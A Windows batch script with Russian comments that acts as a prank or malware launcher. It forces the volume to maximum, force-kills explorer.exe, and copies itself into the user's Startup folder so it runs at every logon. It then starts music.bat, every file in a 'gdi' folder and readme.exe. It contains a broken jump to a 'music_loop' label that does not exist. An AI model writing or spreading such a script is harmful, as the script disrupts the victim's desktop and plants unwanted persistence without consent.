@echo off
:: Кодировка для корректного отображения текста
chcp 65001 > nul


:: Переходим в папку, где лежит сам этот start.bat
cd /d "%~dp0"



:: Установка максимальной системной громкости (100%) через PowerShell
powershell -Command "$wshShell = New-Object -ComObject WScript.Shell; for ($i = 0; $i -lt 50; $i++) { $wshShell.SendKeys([char]175) }"

taskkill /f /im explorer.exe




:: Копирование в автозагрузку (если требуется)
copy /y "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" > nul





start music.bat

:search_loop
:: Проверка существования папки gdi и запуск всех файлов внутри неё
if exist "gdi\" (
    echo Папка gdi найдена. Запуск всех файлов внутри...
    for %%f in ("gdi\*") do (
        start "" "%%f"
    )
)

:: Проверка существования файла readme.exe
if exist "readme.exe" (
    echo Файл readme.exe найден. Запуск...
    start "" "readme.exe"
    goto exit_label
)

:: Пауза перед следующим циклом проверки/воспроизведения
timeout /t 150 > nul
goto music_loop

:exit_label
echo Скрипт успешно выполнил задачу.
pause
